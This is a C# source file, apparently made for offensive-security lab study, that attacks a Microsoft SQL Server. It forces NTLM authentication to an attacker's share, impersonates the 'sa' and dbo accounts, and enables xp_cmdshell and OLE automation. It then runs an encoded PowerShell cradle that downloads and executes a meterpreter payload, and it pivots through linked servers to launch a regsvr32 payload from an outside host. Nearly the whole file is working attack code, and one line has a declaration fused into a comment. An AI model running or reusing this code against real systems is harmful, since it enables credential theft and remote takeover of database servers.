﻿using System;
using System.Data.SqlClient;

namespace MSSQL
{
	public class Program
	{
		public static String executeQuery(String query, SqlConnection con)
		{
			SqlCommand cmd = new SqlCommand(query, con);
			SqlDataReader reader = cmd.ExecuteReader();
			try
			{
				String result = "";
				while (reader.Read() == true)
				{
					result += reader[0] + "\n";
				}
				reader.Close();
				return result;
			}
			catch
			{
				return "";
			}
		}

		public static void getGroupMembership(String groupToCheck, SqlConnection con)
		{
			String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
			int role = int.Parse(res);
			if (role == 1)
			{
				Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
			}
			else
			{
				Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
			}
		}

		public static void Main(string[] args)
		{
			String serv = "dc01.corp1.com";
			String db = "master";
			String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";//“Integrated Security = True”走Windows 身份驗證。
			SqlConnection con = new SqlConnection(conStr);

			try
			{
				con.Open();
				Console.WriteLine("[+] Authenticated to MSSQL Server!");
			}
			catch
			{
				Console.WriteLine("[-] Authentication failed.");
				Environment.Exit(0);
			}

			// Enumerate login info
			String login = executeQuery("SELECT SYSTEM_USER;", con);
			Console.WriteLine($"[*] Logged in as: {login}");
			String uname = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Database username: {uname}");
			getGroupMembership("public", con);
			getGroupMembership("sysadmin", con);

			// Force NTLM authentication for hash-grabbing or relaying
			String targetShare = "\\\\192.168.45.153\\share";//通用命名約定 (UNC) 路徑
			String res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
			Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");//responser打爆破(sudo responder -I tun0)

			// Get logins that we can impersonate
			res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
			Console.WriteLine($"[*] User can impersonate the following logins: {res}.");//Fro next EXECUTE AS，可以枚舉哪些登錄允許模擬，但不能枚舉誰有權模擬它們

			// Impersonate login and get login information
			String su = executeQuery("SELECT SYSTEM_USER;", con);
			String un = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");//模擬前帳號
			//EXECUTE AS語句來完成，它提供了一種在不同登錄名或用戶的上下文中執行 SQL 查詢的方法
			res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
			Console.WriteLine($"[*] Triggered impersonation.");
			su = executeQuery("SELECT SYSTEM_USER;", con);
			un = executeQuery("SELECT USER_NAME();", con);
			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");//模擬後帳號

			// Impersonate dbo in trusted database and execute through 'xp_cmdshell'<==傳統xp_cmdshell打法
		        res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
			Console.WriteLine("[*] Triggered impersonation.");
			res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
			Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
			//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.153 LPORT=8443 EXITFUNC=thread -f powershell
			//$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.153/run.txt') | IEX"
			//$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
			//$EncodedText = [Convert]::ToBase64String($bytes)
			//$EncodedText
			String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
			res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
			Console.WriteLine($"[*] Executed command! Result: {res}");

			// Impersonate dbo in trusted database and execute through 'sp_OACreate' <==osep新打法
			res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
			Console.WriteLine("[*] Triggered impersonation.");
			res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
			Console.WriteLine("[*] Enabled OLE automation procedures.");
			cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
			res = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
			Console.WriteLine($"[*] Executed command!");

			//
			// Execution via loading custom assemblies is also possible, but for brevity not included here
			//

			// Enumerate linked servers
			res = executeQuery("EXEC sp_linkedservers;", con);//sp_linkedserver 不需要任何權限即可執行
			Console.WriteLine($"[*] Found linked servers: {res}");

			// Execute on linked server
			res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;", con);
			Console.WriteLine($"[*] Enabled advanced options on DC01.");
			res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;", con);
			Console.WriteLine($"[*] Enabled xp_cmdshell option on DC01.");
			res = executeQuery("EXEC ('xp_cmdshell ''whoami'';') AT DC01;", con);
			Console.WriteLine($"[*] Triggered command. Result: {res}");

			// Execute on linked server via 'openquery'
			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
			Console.WriteLine($"[*] Enabled advanced options on DC01.");
			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
			Console.WriteLine($"[*] Enabled xp_cmdshell options on DC01.");
			res = executeQuery("select 1 from openquery(\"dc01\", 'select 1; exec xp_cmdshell ''regsvr32 /s /n /u /i:http://192.168.45.153:8080/F0t6R5A.sct scrobj.dll''')", con);
			Console.WriteLine($"[*] Triggered Meterpreter oneliner on DC01. Check your listener!");

			// Escalate via double database linkedString su = executeQuery("SELECT SYSTEM_USER;", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01'.");
			su = executeQuery("select mylogin from openquery(\"dc01\", 'select SYSTEM_USER as mylogin');", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'dc01' via 1 link.");
			su = executeQuery("select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')');", con);
			Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01' via 2 links.");
		}
	}
}
